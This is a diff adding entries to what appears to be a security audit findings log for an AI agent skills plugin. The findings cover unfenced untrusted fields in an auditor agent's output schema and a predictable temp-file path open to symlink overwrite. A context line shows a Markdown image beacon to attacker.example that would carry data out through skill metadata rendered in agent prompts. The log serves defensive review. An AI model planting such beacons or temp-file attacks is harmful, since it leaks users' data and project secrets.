@@ -3180,3 +3180,39 @@ location: plugins/ievo/skills/init/SKILL.md:690-735; plugins/ievo/skills/init/re
 ```
 
 Directly re-read this run (4-module `/ievo:vuln-scan` dogfooding, full 22-file skills-module dispatch): `discover.mjs`'s `skill.name`/`description` fields are validated only by `typeof === "string"` (per `feedback/SKILL.md` Step 3.85's own existing note — "no agentskills.io `[a-z0-9-]+` allowlist is applied at fetch time"), so a malicious public skills.sh/Codex-marketplace listing can set either field to `![beacon](https://attacker.example/x.png?d=<data>)` or a spoofed link. `init/SKILL.md` Step 7b's four `AskUserQuestion` templates (type=skill/agent/plugin×2, lines 690-735) interpolate this content verbatim into `Question`/`description` strings with no excerpt-containment instruction, and `log-format.md`'s Section 5/6/6b/7b tables write the same fields verbatim into the persistent, plain-Markdown `.ievo/log/init-*.md`. `feedback/SKILL.md` Step 3.85 already treats this exact table's content as untrusted but only fences it at issue-attach time, not at write/display time. Confirmed by full-file grep for "containment"/"backtick"/"fenc" across both files — zero matches, unlike `inspect/SKILL.md`/`overlay-status/SKILL.md`, which both apply the established backtick-run-sizing pattern to comparable untrusted rendered fields.
+
+## S-2026-08-30-001 — security-auditor.md's `flags[].file` output field has no excerpt-containment rule, unlike every other free-text field this schema defines
+
+```yaml
+id: S-2026-08-30-001
+discovered_at: 2026-08-30T00:00:00Z
+run_id: 33309295457
+target_repo: ievo-ai/skills
+title: security-auditor.md's Step 2 output schema defines flags[].file with zero excerpt-containment instruction, while the same file's two existing containment notes explicitly cover report_template.body and candidate/alternative_suggestion but never mention flags[].file
+status: issued
+issue_url: https://github.com/ievo-ai/skills/issues/675
+cwe: CWE-79
+confidence: medium
+location: plugins/ievo/agents/security-auditor.md:185 (schema), :192-233 (the two existing containment notes, neither of which names flags[].file)
+```
+
+Directly re-read this run (4-module `/ievo:vuln-scan` dogfooding, agents+commands dispatch, independently re-verified against current source): `security-auditor.md`'s Step 2 schema returns `flags`: array of `{severity, category, file, excerpt, explanation}` on every verdict (GREEN/YELLOW/RED alike). The audited candidate is an arbitrary third-party repo — this agent's whole reason to exist — and git tree-path components forbid only `/` and NUL, so `file` can carry Markdown-active syntax. The file's own two "Excerpt containment" notes are exhaustively scoped: one covers `report_template.body` (RED-only) and explicitly disclaims covering any other surface that renders `flags[].excerpt`/`explanation`; the other covers `candidate`/`alternative_suggestion` (every verdict). Neither note — nor anywhere else in the file — mentions `flags[].file`, leaving it the one schema field with no stated containment rule at all, on every verdict. A downstream renderer (`/ievo:init` Step 8a's install-decision tables, `update.md`'s re-audit prompt) has no signal from this schema's own documentation that `file` needs the same treatment `candidate` explicitly requires. Distinct from `skills#666` (covers `candidate`/`alternative_suggestion`, a different field) and `skills#556` (covers `flags[].excerpt` secret-redaction, a different risk).
+
+## S-2026-08-30-002 — handoff/SKILL.md writes its output to a predictable path in the shared OS temp directory with no permission or symlink hardening
+
+```yaml
+id: S-2026-08-30-002
+discovered_at: 2026-08-30T00:00:00Z
+run_id: 33309295457
+target_repo: ievo-ai/skills
+title: handoff/SKILL.md Step 1/Step 4 write a curated session-context document (including best-effort-redacted secrets and project internals) to <temp-dir>/ievo-handoff-<YYYYMMDD-HHMMSS>.md with no random component, no pre-write existence/symlink check, and no owner-only permission hardening, unlike deep-review/SKILL.md's explicit symlink-skip guard in the same plugin
+status: issued
+issue_url: https://github.com/ievo-ai/skills/issues/676
+cwe: CWE-377
+confidence: medium
+location: plugins/ievo/skills/handoff/SKILL.md:67 (Step 1: Determine output path), Step 4 (Write the handoff document)
+```
+
+Directly re-read this run (4-module `/ievo:vuln-scan` dogfooding, skills-module dispatch, independently re-verified against current source): Step 1 builds the output path as `<temp-dir>/ievo-handoff-<YYYYMMDD-HHMMSS>.md` — a deterministic, second-granularity-timestamped name under `TMPDIR`/`TEMP`/`TMP`/`/tmp`, none of which are guaranteed private to the invoking user on a shared multi-user devbox, shared CI runner, or multi-tenant container. Step 4 then Writes to that exact path with no documented check that the target doesn't already exist, isn't a symlink, or is created with owner-only permissions — in contrast to `deep-review/SKILL.md`'s explicit `[ -L "$p" ]` symlink-skip guard for untracked files in the very same plugin, showing the authors are otherwise alert to this exact risk class elsewhere. The document itself (git branch, PR/issue URLs, project internals, and Step 3's own acknowledged "best-effort" secret redaction that "cannot catch every secret") is sensitive by design. On a shared host, another local user can read the file at its default/inherited permissions by guessing the near-certain timestamp window or polling for new `ievo-handoff-*.md` entries; if the write path follows an existing symlink (platform-dependent, not verified either way by this finding), a pre-planted symlink at a guessed near-future timestamp could redirect the write to overwrite a file the victim can write to.
+
+Recommendation: add a high-entropy random component to the filename in addition to the timestamp, refuse/regenerate if the target path already exists, and set owner-only permissions (`chmod 600`-equivalent) after writing — documented the same way `deep-review/SKILL.md`'s symlink-skip guard is documented.
